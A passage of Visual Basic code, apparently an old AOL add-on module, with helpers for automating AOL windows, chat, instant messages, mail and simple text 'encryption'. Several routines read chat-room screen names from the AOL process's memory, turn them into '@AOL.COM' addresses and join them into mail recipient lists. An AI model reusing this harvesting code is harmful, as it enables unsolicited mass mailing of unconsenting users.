ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ <> AOLGetUser() Then Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Public Sub AddRoom_WithExt(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = Person$ & "@AOL.COM"
If Person$ <> AOLGetUser() Then Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Public Sub AddRoom_WithComma(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = Person$ & ", "
If Person$ <> AOLGetUser() Then Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub



Function ListToList(source, destination)
counts = SendMessage(source, LB_GETCOUNT, 0, 0)

For Adding = 0 To counts - 1
Buffer$ = String$(250, 0)
getstrings% = SendMessageByString(source, LB_GETTEXT, Adding, Buffer$)
addstrings% = SendMessageByString(destination, LB_ADDSTRING, 0, Buffer$)
Next Adding

End Function

Function MouseOverHwnd()
    ' Declares
      Dim pt32 As pointapi
      Dim ptx As Long
      Dim pty As Long
   
      Call GetCursorPos(pt32)               ' Get cursor position
      ptx = pt32.X
      pty = pt32.Y
      MouseOverHwnd = WindowFromPointXY(ptx, pty)    ' Get window cursor is over
End Function

Function UntilWindowClass(Parent, news$)
Do: DoEvents
e = FindChildByClass(Parent, news$)
Loop Until e
UntilWindowClass = e
End Function


Function UntilWindowTitle(Parent, news$)
Do: DoEvents
e = FindChildByTitle(Parent, news$)
Loop Until e
UntilWindowTitle = e
End Function
Public Function AOLGetList(Index, Buffer As String)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If

Buffer$ = Person$
End Function
Function AddListToString(thelist As ListBox)
For DoList = 0 To thelist.ListCount - 1
AddListToString = AddListToString & thelist.List(DoList) & ", "
Next DoList
AddListToString = Mid(AddListToString, 1, Len(AddListToString) - 2)

End Function

Function AddListToMailString(thelist As ListBox)
If thelist.List(0) = "" Then GoTo last
For DoList = 0 To thelist.ListCount - 1
AddListToMailString = AddListToMailString & "(" & thelist.List(DoList) & "), "
Next DoList
AddListToMailString = Mid(AddListToMailString, 1, Len(AddListToMailString) - 2)
last:
End Function
Function SearchForSelected(lst As ListBox)
If lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

Start:
counterf = counterf + 1
If lst.ListCount = counterf + 1 Then GoTo last
If lst.Selected(counterf) = True Then GoTo last
If couterf = lst.ListCount Then GoTo last
GoTo Start

last:
SearchForSelected = counterf
End Function
Sub AddStringToList(theitems, thelist As ListBox)
If Not Mid(theitems, Len(theitems), 1) = "," Then
theitems = theitems & ","
End If

For DoList = 1 To Len(theitems)
thechars$ = thechars$ & Mid(theitems, DoList, 1)

If Mid(theitems, DoList, 1) = "," Then
thelist.AddItem Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
If Mid(theitems, DoList + 1, 1) = " " Then
DoList = DoList + 1
End If
End If
Next DoList

End Sub
Function AOLClickList(hwnd)
clicklist% = sendmessagebynum(hwnd, &H203, 0, 0&)
End Function

Function AOLCountMail()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function AOLGetListString(Parent, Index, Buffer As String)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

aolhandle = Parent

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If

Buffer$ = Person$
End Function

Sub AOLHide()
a = showwindow(AOLWindow(), SW_HIDE)
End Sub

Sub AOLOpenChat()
If AOLFindRoom() Then Exit Sub
AOLKeyword ("pc")
Do: DoEvents
Loop Until AOLFindRoom()

End Sub
Public Sub AOLOpenNewMail()
Call AOLRunMenuByString("Read &New Mail")
End Sub


Public Sub AOLOpenOLDMail()
Call AOLRunMenuByString("Check Mail You've &Read")
End Sub
Public Sub AOLOpenSentMail()
Call AOLRunMenuByString("Check Mail You've &Sent")
End Sub
Public Sub AOLSignOnCaption(newcaption As String)
setup% = FindChildByTitle(AOLMDI(), "Welcome")
Call AOLSetText(setup%, newcaption)
End Sub
Sub AOLRespondIM(message)
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Z
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Z
Exit Sub
Z:
e = FindChildByClass(im%, "RICHCNTL")

e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e = getwindow(e, 2)
e2 = getwindow(e, 2) 'Send Text
e = getwindow(e2, 2) 'Send Button
Call AOLSetText(e2, message)
AOLIcon (e)
Pause 4
KillWin (im%)
End Sub

Sub AOLRunMenuByString(stringer As String)
Call runmenubystring(AOLWindow(), stringer)
End Sub


Sub AOLUnHide()
a = showwindow(AOLWindow(), SW_SHOW)
End Sub

Sub AOLWaitMail()
mailwin% = Gettopwindow(AOLMDI())
aoltree% = FindChildByClass(mailwin%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
Pause (10)
secondcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Sub


Function EncryptType(Text, types)
'to encrypt, example:
'encrypted$ = EncryptType("messagetoencrypt", 0)
'to decrypt, example:
'decrypted$ = EncryptType("decryptedmessage", 1)
'* First Paramete is the Message
'* Second Parameter is 0 for encrypt
'  or 1 for decrypt

For God = 1 To Len(Text)
If types = 0 Then
current$ = Asc(Mid(Text, God, 1)) - 1
Else
current$ = Asc(Mid(Text, God, 1)) + 1
End If
Process$ = Process$ & Chr(current$)
Next God

EncryptType = Process$
End Function



Function GetText(child)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)
GetText = trimspace$
End Function
Function GetWinText(child)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)
GetWinText = trimspace$
End Function






Function DescrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Descrambles the text
For scrambling = 1 To Len(thetext)
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function



Function GetLineCount(Text)

theview$ = Text


For FindChar = 1 To Len(theview$)
thechar$ = Mid(theview$, FindChar, 1)

If thechar$ = Chr(13) Then
numline = numline + 1
End If

Next FindChar

If Mid(Text, Len(Text), 1) = Chr(13) Then
GetLineCount = numline
Else
GetLineCount = numline + 1
End If
End Function

Sub HideWindow(hwnd)
hi = showwindow(hwnd, SW_HIDE)
End Sub


Function IntegerToString(tochange As Integer) As String
IntegerToString = Str$(tochange)
End Function

Function LineFromText(Text, theline)
theview$ = Text

For FindChar = 1 To Len(theview$)
thechar$ = Mid(theview$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
c = c + 1
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
If theline = c Then GoTo ex
thechars$ = ""
End If

Next FindChar
Exit Function
ex:
thechatext$ = ReplaceText(thechatext$, Chr(13), "")
thechatext$ = ReplaceText(thechatext$, Chr(10), "")

LineFromText = thechatext$
End Function


Function ReplaceText(Text, charfind, charchange)
If InStr(Text, charfind) = 0 Then
ReplaceText = Text
Exit Function
End If

For Replace = 1 To Len(Text)
thechar$ = Mid(Text, Replace, 1)
thechars$ = thechars$ & thechar$

If thechar$ = charfind Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1) + charchange
End If
Next Replace

ReplaceText = thechars$

End Function



Sub MaxWindow(hwnd)
ma = showwindow(hwnd, SW_MAXIMIZE)
End Sub

Sub MiniWindow(hwnd)
MI2 = showwindow(hwnd, SW_MINIMIZE)
End Sub

Function NumericNumber(thenumber)
NumericNumber = Val(thenumber)
'turns the "number" so vb recognizes it for
'addition, subtraction, ect.
End Function

Sub ParentChange(Parent%, location%)
doparent% = setparent(Parent%, location%)
End Sub


Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Function ReverseText(Text)
For Words = Len(Text) To 1 Step -1
ReverseText = ReverseText & Mid(Text, Words, 1)
Next Words


End Function

Sub runmenubystring(Application, StringSearch)
ToSearch% = Getmenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
Subcount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, Subcount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = Subcount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub

Sub AOLRunTool(tool)
Toolbar% = FindChildByClass(AOLWindow(), "AOL Toolbar")
iconz% = FindChildByClass(Toolbar%, "_AOL_Icon")
For X = 1 To tool - 1
iconz% = getwindow(iconz%, 2)
Next X
isen% = IsWindowEnabled(iconz%)
If isen% = 0 Then Exit Sub
AOLIcon (iconz%)
End Sub
Function AOLStayOnline()
hwndz% = findwindow(AOLWindow(), "®î†µå£²×¹:®µ£z åö£")
childhwnd% = FindChildByTitle(hwndz%, "OK")
AOLButton (childhwnd%)
End Function

Public Sub CenterCorner(frmForm As Form)
'This will center you form in the upper right
'of the users screen
   With frmForm
      .Left = (Screen.Width - .Width) / 1
      .Top = (Screen.Height - .Height) / 2000
   End With
End Sub
Function StringToInteger(tochange As String) As Integer
StringToInteger = tochange
End Function
Function TrimCharacter(thetext, chars)
TrimCharacter = ReplaceText(thetext, chars, "")

End Function

Function TrimReturns(thetext)
takechr13 = ReplaceText(thetext, Chr$(13), "")
takechr10 = ReplaceText(takechr13, Chr$(10), "")
TrimReturns = takechr10
End Function

Function TrimSpaces(Text)
If InStr(Text, " ") = 0 Then
TrimSpaces = Text
Exit Function
End If

For trimspace = 1 To Len(Text)
thechar$ = Mid(Text, trimspace, 1)
thechars$ = thechars$ & thechar$

If thechar$ = " " Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
End If
Next trimspace

TrimSpaces = thechars$
End Function


Function AOLMDI()
aol% = findwindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(aol%, "MDIClient")
End Function



Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = getwindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function


Function FindSendWin(dosloop)
firs% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = getwindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = getwindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Public Sub CenterForm(frmForm As Form)
   With frmForm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / 2
   End With
End Sub

Public Sub CenterFormTop(frm As Form)
   With frm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / (Screen.Height)
   End With
End Sub

Public Function GetChildCount(ByVal hwnd As Long) As Long
Dim hChild As Long

Dim i As Integer
   
If hwnd = 0 Then
GoTo Return_False
End If

hChild = getwindow(hwnd, GW_CHILD)
   

While hChild
hChild = getwindow(hChild, GW_HWNDNEXT)
i = i + 1
Wend

GetChildCount = i
   
Exit Function
Return_False:
GetChildCount = 0
Exit Function
End Function

Public Sub AOLButton(but%)
clickicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
clickicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub

Function AOLIMSTATIC(newcaption As String)
ANTI1% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
STS% = FindChildByClass(ANTI1%, "_AOL_Static")
st% = getwindow(STS%, GW_HWNDNEXT)
st% = getwindow(st%, GW_HWNDNEXT)
Call ChangeCaption(st%, newcaption)
End Function

Function AOLGetUser()
On Error Resume Next
aol& = findwindow("AOL Frame25", "®î†µå£²×¹:®µ£z åö£")
mdi& = FindChildByClass(aol&, "MDIClient")
welcome% = FindChildByTitle(mdi&, "Welcome, ")
WelcomeLength& = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a& = getwindowtext(welcome%, WelcomeTitle$, (WelcomeLength& + 1))
User$ = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = User$
End Function

Sub AOLIMOff()
Call AOLInstantMessage("$IM_OFF", "®î†µå£²×¹:®µ£z åö£")
End Sub

Sub AOLIMsOn()
Call AOLInstantMessage("$IM_ON", "®î†µå£²×¹:®µ£z åö£")

End Sub


Sub AOLChatSend3(txt)
' For AOL 3.0
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
'A1000% = FindChildByClass(Room%, "_AOL_Edit")
'A2000% = GetWindow(A1000%, 2)
'AOLIcon (A2000%)

End Sub


Sub sendtext(txt)
' For AOL 3.0
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
'A1000% = FindChildByClass(Room%, "_AOL_Edit")
'A2000% = GetWindow(A1000%, 2)
'AOLIcon (A2000%)

End Sub

Sub AOLCursor()
Call runmenubystring(AOLWindow(), "&About AOL Canada")
Do: DoEvents
Loop Until findwindow("_AOL_Modal", vbNullString)
SendMessage findwindow("_AOL_Modal", vbNullString), WM_Close, 0, 0
End Sub

Function AOLFindRoom()
Dim aol
Dim mdi
Dim ChildFocus
Dim listers
Dim Listere
Dim Listerb
aol = findwindow("AOL Frame25", vbNullString)
mdi = FindChildByClass(aol, "MDIClient")
ChildFocus = getwindow(mdi, 5)

While ChildFocus
listers = FindChildByClass(ChildFocus, "_AOL_Edit")
Listere = FindChildByClass(ChildFocus, "_AOL_View")
Listerb = FindChildByClass(ChildFocus, "_AOL_Listbox")

If listers <> 0 And Listere <> 0 And Listerb <> 0 Then AOLFindRoom = ChildFocus: Exit Function
ChildFocus = getwindow(ChildFocus, 2)
Wend


End Function
Function FindOpenMail()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
ChildFocus% = getwindow(mdi%, 5)

While ChildFocus%
listers% = FindChildByClass(ChildFocus%, "RICHCNTL")
Listere% = FindChildByClass(ChildFocus%, "_AOL_Icon")
Listerb% = FindChildByClass(ChildFocus%, "_AOL_Button")

If listers% <> 0 And Listere% <> 0 And Listerb% <> 0 Then FindOpenMail = ChildFocus%: Exit Function
ChildFocus% = getwindow(ChildFocus%, 2)
Wend


End Function

Function FindForwardWindow()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
ChildFocus% = getwindow(mdi%, 5)

While ChildFocus%
listers% = FindChildByTitle(ChildFocus%, "Send Now")
Listere% = FindChildByClass(ChildFocus%, "_AOL_Icon")
Listerb% = FindChildByClass(ChildFocus%, "_AOL_Button")

If listers% <> 0 And Listere% <> 0 And Listerb% <> 0 Then FindForwardWindow = ChildFocus%: Exit Function
ChildFocus% = getwindow(ChildFocus%, 2)
Wend
End Function



Function AOLGetChat()
childs% = AOLFindRoom()
child = FindChildByClass(childs%, "_AOL_View")


GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)

theview$ = trimspace$
AOLGetChat = theview$
End Function

Sub ADD_AOL_LB(itm As String, lst As ListBox)
If lst.ListCount = 0 Then
lst.AddItem itm
Exit Sub
End If
Do Until XX = (lst.ListCount)
Let diss_itm$ = lst.List(XX)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let XX = XX + 1
Loop
If do_it = "NO" Then Exit Sub
lst.AddItem itm
End Sub
Function KTEncrypt(ByVal PassWord, ByVal strng, force%)
'Example:
'temp = KTEncrypt ("Paszwerd", text1.text, 0)
'text1.text = temp


  'Set error capture routine
  On Local Error GoTo ErrorHandler

  
  'Is there Password??
  If Len(PassWord) = 0 Then Error 31100
  
  'Is password too long
  If Len(PassWord) > 255 Then Error 31100

  'Is there a strng$ to work with?
  If Len(strng) = 0 Then Error 31100

  
  'Check if file is encrypted and not forcing
  If force% = 0 Then
    
    'Check for encryption ID tag
    chk$ = Left$(strng, 4) + Right$(strng, 4)
    
    If chk$ = Chr$(1) + "KT" + Chr$(1) + Chr$(1) + "KT" + Chr$(1) Then
      
      'Remove ID tag
      strng = Mid$(strng, 5, Len(strng) - 8)
      
      'String was encrypted so filter out CHR$(1) flags
      look = 1
      Do
        look = InStr(look, strng, Chr$(1))
        If look = 0 Then
          Exit Do
        Else
          Addin$ = Chr$(Asc(Mid$(strng, look + 1)) - 1)
          strng = Left$(strng, look - 1) + Addin$ + Mid$(strng, look + 2)
        End If
        look = look + 1
      Loop
      
      'Since it is encrypted we want to decrypt it
      EncryptFlag% = False
    
    Else
      'Tag not found so flag to encrypt string
      EncryptFlag% = True
    End If
  Else
    'force% flag set, ecrypt string regardless of tag
    EncryptFlag% = True
  End If
    


  'Set up variables
  PassUp = 1
  PassMax = Len(PassWord)
  
  
  'Tack on leading characters to prevent repetative recognition
  PassWord = Chr$(Asc(Left$(PassWord, 1)) Xor PassMax) + PassWord
  PassWord = Chr$(Asc(Mid$(PassWord, 1, 1)) Xor Asc(Mid$(PassWord, 2, 1))) + PassWord
  PassWord = PassWord + Chr$(Asc(Right$(PassWord, 1)) Xor PassMax)
  PassWord = PassWord + Chr$(Asc(Right$(PassWord, 2)) Xor Asc(Right$(PassWord, 1)))
  
  
  'If Encrypting add password check tag now so it is encrypted with string
  If EncryptFlag% = True Then
    strng = Left$(PassWord, 3) + Format$(Asc(Right$(PassWord, 1)), "000") + Format$(Len(PassWord), "000") + strng
  End If
  
  'Loop until scanned though the whole string
  For Looper = 1 To Len(strng)
DoEvents
    'Alter character code
    tochange = Asc(Mid$(strng, Looper, 1)) Xor Asc(Mid$(PassWord, PassUp, 1))

    'Insert altered character code
    Mid$(strng, Looper, 1) = Chr$(tochange)
    
    'Scroll through password string one character at a time
    PassUp = PassUp + 1
    If PassUp > PassMax + 4 Then PassUp = 1
      
  Next Looper

  'If encrypting we need to filter out all bad character codes (0, 10, 13, 26)
  If EncryptFlag% = True Then
    'First get rid of all CHR$(1) since that is what we use for our flag
    look = 1
    Do
      look = InStr(look, strng, Chr$(1))
      If look > 0 Then
        strng = Left$(strng, look - 1) + Chr$(1) + Chr$(2) + Mid$(strng, look + 1)
        look = look + 1
      End If
    Loop While look > 0

    'Check for CHR$(0)
    Do
      look = InStr(strng, Chr$(0))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(1) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(10)
    Do
      look = InStr(strng, Chr$(10))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(11) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(13)
    Do
      look = InStr(strng, Chr$(13))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(14) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(26)
    Do
      look = InStr(strng, Chr$(26))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(27) + Mid$(strng, look + 1)
    Loop While look > 0

    'Tack on encryted tag
    strng = Chr$(1) + "KT" + Chr$(1) + strng + Chr$(1) + "KT" + Chr$(1)

  Else
    
    'We decrypted so ensure password used was the correct one
    If Left$(strng, 9) <> Left$(PassWord, 3) + Format$(Asc(Right$(PassWord, 1)), "000") + Format$(Len(PassWord), "000") Then
      'Password bad cause error
      Error 31100
    Else
      'Password good, remove password check tag
      strng = Mid$(strng, 10)
    End If

  End If


  'Set function equal to modified string
  KTEncrypt = strng
  

  'Were out of here
  Exit Function


ErrorHandler:
  
  'We had an error!  Were out of here
  Exit Function

End Function


Function LastChatLine()
'Gets last chat line text
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub GetNum(og%, a)
Do: DoEvents
If a = 0 Then Exit Sub
B = 1 + B
og% = getwindow(og%, GW_HWNDNEXT)
Loop Until B >= a - 1

End Sub

Function GetAOLWinB(Parent As Integer, ClassToFind As String, Num As Integer)
Dim DooD As Integer
DooD = 0
Count = (Num) 'Count Out The Number Of Windows Over You Want To Look For
'If num = 0 Then MsgBox "Are You An Asshole": Exit Function'Won't Let You Look For Nothing
DoEvents
a% = FindChildByClass(Parent%, ClassToFind$) 'Begin Your Search For Da Window
DooD = DooD + 1 'If You Find One Add 1 To Your Counter
Do
DoEvents
If DooD = Num Then 'If Your Counter = Your Number Then Exit Function
GetAOLWinB = a% 'Declare The Function
Exit Function
End If
DoEvents
Do         'Begin a Do...Loop to look For The Class Name
DoEvents
a% = getwindow(a%, GW_HWNDNEXT)
bb$ = String(255, 0)
CC% = GetClassName(a%, bb$, 254) 'Use This To Get The Class Name Of The Window You Found
bb$ = Disc(bb$)
If bb$ = ClassToFind$ Then DooD = DooD + 1 'Then Compare
If DooD = Num Then Exit Do
Loop Until bb$ = ClassToFind$ 'Loop Until You Find The Window With The Class Name You're Looking For
Loop Until DooD = Num 'Loop Until Your Counter Is = To Your Number
GetAOLWinB = a% 'Declare The Function

End Function

Function Disc(ByVal Marbro As String) As String
On Error Resume Next
Disc = Left$(Marbro$, InStr(Marbro$, Chr$(0)) - 1)
End Function

Function RemoveSpace(thetext$)
Dim Text$
Dim theloop%
Text$ = thetext$
For theloop% = 1 To Len(thetext$)
If Mid(Text$, theloop%, 1) = " " Then
Text$ = Left$(Text$, theloop% - 1) + Right$(Text$, Len(Text$) - theloop%)
theloop% = theloop% - 1
End If
Next
RemoveSpace = Text$
End Function

Function Style(messg, frm As Form, a1%, a2%, a3%, b1%, b2%, b3%)
   C1BAK = C1
   C2BAK = C2
   C3BAK = C3
   C4BAK = C4
   c = 0
   O = 0
   o2 = 0
   Q = 1
   Q2 = 1
   For X = 1 To Len(messg)
            BVAL1 = frm.b1% - frm.a1%
            BVAL2 = frm.b2% - frm.a2%
            BVAL3 = frm.b3% - frm.a3%
            val1 = (BVAL1 / Len(messg) * X) + frm.a1%
            val2 = (BVAL2 / Len(messg) * X) + frm.a2%
            VAL3 = (BVAL3 / Len(messg) * X) + frm.a3%
            C1 = RGB2HEX(val1, val2, VAL3)
            C2 = RGB2HEX(val1, val2, VAL3)
            C3 = RGB2HEX(val1, val2, VAL3)
            C4 = RGB2HEX(val1, val2, VAL3)
            If C1 = C2 And C2 = C3 And C3 = C4 And C4 = C1 Then c = 1: Msg = Msg & "<FONT COLOR=#" + C1 + ">"
